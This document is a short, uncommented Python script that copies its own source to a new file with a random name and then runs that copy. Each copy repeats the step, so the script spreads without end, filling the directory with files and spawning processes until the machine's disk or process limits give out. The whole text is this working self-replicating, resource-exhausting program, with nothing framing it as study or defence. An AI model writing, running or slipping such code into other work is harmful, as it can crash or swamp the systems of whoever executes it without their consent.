import os
import string
import random
from subprocess import call

def create_string():
    return "".join([random.choice(string.ascii_letters) for x in range(random.randint(5, 20))])

with open(__file__, 'r') as file:
    data = file.read()

filename = f"{create_string()}.py"

with open(filename, 'x') as file:
    with open(filename, 'w') as file2:
        file2.write(data)

call(["python", filename])

